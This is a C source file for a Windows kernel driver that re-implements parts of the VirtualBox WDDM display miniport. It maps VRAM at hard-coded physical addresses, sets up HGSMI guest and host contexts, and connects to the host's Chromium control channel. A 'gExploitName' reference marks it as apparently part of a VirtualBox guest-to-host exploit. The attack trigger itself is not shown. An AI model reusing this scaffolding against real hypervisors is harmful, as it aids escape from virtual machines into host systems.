#include <ntddk.h>
#include <VBoxMPDevExt.h>

/* MyMain.cpp */
extern WCHAR gExploitName[];

/* VBoxMPHGSMI.cpp */
extern DECLCALLBACK(void *) hgsmiEnvAlloc(void *pvEnv, HGSMISIZE cb);
extern DECLCALLBACK(void) hgsmiEnvFree(void *pvEnv, void *pv);
extern HGSMIENV g_hgsmiEnvMP;

/* VBoxWddm.cpp */
extern PVOID vboxWddmMemAllocZero(IN SIZE_T cbSize);
extern void vboxWddmDevExtZeroinit(PVBOXMP_DEVEXT pDevExt, CONST PDEVICE_OBJECT pPDO);

/* MyMemoryMapper.cpp */
extern NTSTATUS MyMapPhysicalToVirtual(PVOID* virtOut, PHYSICAL_ADDRESS phys, PHYSICAL_ADDRESS physLen);

/* VBoxMPWddm.cpp */
typedef struct VBOXWDDM_HWRESOURCES
{
	PHYSICAL_ADDRESS phVRAM;
	ULONG cbVRAM;
	ULONG ulApertureSize;
} VBOXWDDM_HWRESOURCES, *PVBOXWDDM_HWRESOURCES;

NTSTATUS
MyDxgkDdiCreateContext(PVBOXWDDM_CONTEXT* pContextOut, PVBOXWDDM_DEVICE pDevice, PVBOXMP_DEVEXT pDevExt) {
	PVBOXWDDM_CONTEXT pContext = (PVBOXWDDM_CONTEXT)vboxWddmMemAllocZero(sizeof(VBOXWDDM_CONTEXT));
	if (!pContext) {
		return STATUS_NO_MEMORY;
	}

	pContext->pDevice = pDevice;
	pContext->hContext = NULL;
	pContext->EngineAffinity = 0;
	pContext->NodeOrdinal = 0;
	vboxVideoCmCtxInitEmpty(&pContext->CmContext);
	pContext->enmType = VBOXWDDM_CONTEXT_TYPE_SYSTEM;

	VBoxMpCrPackerInit(&pContext->CrPacker);
	int rc = VBoxMpCrCtlConConnect(pDevExt, &pDevExt->CrCtlCon, CR_PROTOCOL_VERSION_MAJOR, CR_PROTOCOL_VERSION_MINOR, &pContext->u32CrConClientID);
	if (!RT_SUCCESS(rc)) {
		return STATUS_UNSUCCESSFUL;
	}

	*pContextOut = pContext;
	return STATUS_SUCCESS;
}

NTSTATUS
MyVBoxMPCmnMapAdapterMemory(PVBOXMP_COMMON pCommon, void **ppv, uint32_t ulOffset, uint32_t ulSize) {
	NTSTATUS Status;
	PHYSICAL_ADDRESS FrameBuffer;
	PHYSICAL_ADDRESS FrameBufferLen;
	FrameBuffer.QuadPart = pCommon->phVRAM.QuadPart + ulOffset;
	FrameBufferLen.QuadPart = ulSize;
	PVOID VideoRamBase = NULL;
	if ((Status = MyMapPhysicalToVirtual(&VideoRamBase, FrameBuffer, FrameBufferLen)) != STATUS_SUCCESS) {
		return Status;
	}

	*ppv = VideoRamBase;
	return STATUS_SUCCESS;
}

NTSTATUS
MyVBoxSetupDisplaysHGSMI(PVBOXMP_COMMON pCommon, PHYSICAL_ADDRESS phVRAM, uint32_t ulApertureSize,
	uint32_t cbVRAM, uint32_t fCaps) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PVBOXMP_DEVEXT pDevExt = VBoxCommonToPrimaryExt(pCommon);

	memset(pCommon, 0, sizeof(*pCommon));
	pCommon->phVRAM = phVRAM;
	pCommon->ulApertureSize = ulApertureSize;
	pCommon->cbVRAM = cbVRAM;
	pCommon->cDisplays = 1;
	pCommon->bHGSMI = VBoxHGSMIIsSupported();
	if (!pCommon->bHGSMI) {
		return STATUS_UNSUCCESSFUL;
	}

	uint32_t offVRAMBaseMapping = 0;	// 0x7FF0000
	uint32_t cbMapping = 0;				// 0x10000
	uint32_t offGuestHeapMemory = 0;	// 0x0
	uint32_t cbGuestHeapMemory = 0;		// 0xFFF0
	uint32_t offHostFlags = 0;			// 0xFFF0
	VBoxHGSMIGetBaseMappingInfo(
		pCommon->cbVRAM,
		&offVRAMBaseMapping,
		&cbMapping,
		&offGuestHeapMemory,
		&cbGuestHeapMemory,
		&offHostFlags);

	/* Map the adapter information. It will be needed for HGSMI IO. */
	Status = MyVBoxMPCmnMapAdapterMemory(pCommon, &pCommon->pvAdapterInformation, offVRAMBaseMapping, cbMapping);
	if (Status != STATUS_SUCCESS) {
		return Status;
	}
	// pvAdapterInformation = 0x40000

	/* Setup an HGSMI heap within the adapter information area. */
	int rc = VBoxHGSMISetupGuestContext(
		&pCommon->guestCtx,
		pCommon->pvAdapterInformation,
		cbGuestHeapMemory,
		offVRAMBaseMapping + offGuestHeapMemory,
		&g_hgsmiEnvMP);
	if (!RT_SUCCESS(rc)) {
		return STATUS_UNSUCCESSFUL;
	}

	/* Setup the host heap and the adapter memory. */
	uint32_t offVRAMHostArea = 0;
	uint32_t cbHostArea = 0;
	VBoxHGSMIGetHostAreaMapping(
		&pCommon->guestCtx,
		pCommon->cbVRAM,
		offVRAMBaseMapping,
		&offVRAMHostArea,
		&cbHostArea);
	if (cbHostArea == 0) {
		return STATUS_UNSUCCESSFUL;
	}

	/* Map the heap region.
	*
	* Note: the heap will be used for the host buffers submitted to the guest.
	*       The miniport driver is responsible for reading FIFO and notifying
	*       display drivers.
	*/
	pCommon->cbMiniportHeap = cbHostArea;
	Status = MyVBoxMPCmnMapAdapterMemory(pCommon, &pCommon->pvMiniportHeap, offVRAMHostArea, cbHostArea);
	if (Status != STATUS_SUCCESS) {
		return Status;
	}
	// pvMiniportHeap = 0x50000

	VBoxHGSMISetupHostContext(
		&pCommon->hostCtx,
		pCommon->pvAdapterInformation,
		offHostFlags,
		pCommon->pvMiniportHeap,
		offVRAMHostArea,
		cbHostArea);

	/* Setup the information for the host. */
	rc = VBoxHGSMISendHostCtxInfo(
		&pCommon->guestCtx,
		offVRAMBaseMapping + offHostFlags,
		fCaps,
		offVRAMHostArea,
		pCommon->cbMiniportHeap);
	if (!RT_SUCCESS(rc)) {
		return STATUS_UNSUCCESSFUL;
	}

	/* Query the configured number of displays. */
	pCommon->cDisplays = VBoxHGSMIGetMonitorCount(&pCommon->guestCtx);
	/* Query supported VBVA_SCREEN_F_* flags. */
	pCommon->u16SupportedScreenFlags = VBoxHGSMIGetScreenFlags(&pCommon->guestCtx);

	return STATUS_SUCCESS;
}

NTSTATUS
MyDxgkDdiStartDevice(PVBOXMP_DEVEXT pDevExt) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	pDevExt->fTexPresentEnabled = TRUE;
	pDevExt->fCmdVbvaEnabled = TRUE;
	pDevExt->fComplexTopologiesEnabled = FALSE;

	VBOXWDDM_HWRESOURCES HwRc;
	HwRc.phVRAM.QuadPart = 0xE0000000;
	HwRc.cbVRAM = 0x8000000;
	HwRc.ulApertureSize = 0x8000000;

	Status = MyVBoxSetupDisplaysHGSMI(
		VBoxCommonFromDeviceExt(pDevExt),
		HwRc.phVRAM,
		HwRc.ulApertureSize,
		HwRc.cbVRAM,
		VBVACAPS_COMPLETEGCMD_BY_IOREAD | VBVACAPS_IRQ);

	return Status;
}

NTSTATUS
MyDxgkDdiCreateDevice(PVBOXWDDM_DEVICE* pDeviceOut, PVBOXMP_DEVEXT pDevExt) {
	PVBOXWDDM_DEVICE pDevice = (PVBOXWDDM_DEVICE)vboxWddmMemAllocZero(sizeof(VBOXWDDM_DEVICE));
	if (!pDevice) {
		return STATUS_NO_MEMORY;
	}

	pDevice->pAdapter = pDevExt;
	pDevice->hDevice = NULL;
	pDevice->enmType = VBOXWDDM_DEVICE_TYPE_SYSTEM;

	*pDeviceOut = pDevice;
	return STATUS_SUCCESS;
}

NTSTATUS
MyDxgkDdiAddDevice(PVBOXMP_DEVEXT* pDevExtOut) {
	WCHAR* name = gExploitName;
	ULONG nameLen = wcslen(name) * 2 + 2;
	PVBOXMP_DEVEXT pDevExt = (PVBOXMP_DEVEXT)vboxWddmMemAllocZero(VBOXWDDM_ROUNDBOUND(sizeof(VBOXMP_DEVEXT), 8) + nameLen);
	if (!pDevExt) {
		return STATUS_NO_MEMORY;
	}

	PWCHAR pName = (PWCHAR)(((uint8_t*)pDevExt) + VBOXWDDM_ROUNDBOUND(sizeof(VBOXMP_DEVEXT), 8));
	memcpy(pName, name, nameLen);
	vboxWddmDevExtZeroinit(pDevExt, NULL /* PhysicalDeviceObject */);

	*pDevExtOut = pDevExt;
	return STATUS_SUCCESS;
}

NTSTATUS
InitializeHGSMI(PVBOXWDDM_DEVICE* pDeviceOut, PVBOXMP_DEVEXT* pDevExtOut, PVBOXWDDM_CONTEXT* pContextOut) {
	NTSTATUS Status = STATUS_UNSUCCESSFUL;

	PVBOXMP_DEVEXT pDevExt = NULL;
	if ((Status = MyDxgkDdiAddDevice(&pDevExt)) != STATUS_SUCCESS) {
		return Status;
	}

	PVBOXWDDM_DEVICE pDevice = NULL;
	if ((Status = MyDxgkDdiCreateDevice(&pDevice, pDevExt)) != STATUS_SUCCESS) {
		return Status;
	}

	if ((Status = MyDxgkDdiStartDevice(pDevExt)) != STATUS_SUCCESS) {
		return Status;
	}

	PVBOXWDDM_CONTEXT pContext = NULL;
	if ((Status = MyDxgkDdiCreateContext(&pContext, pDevice, pDevExt)) != STATUS_SUCCESS) {
		return Status;
	}

	*pDeviceOut = pDevice;
	*pDevExtOut = pDevExt;
	*pContextOut = pContext;
	return STATUS_SUCCESS;
}
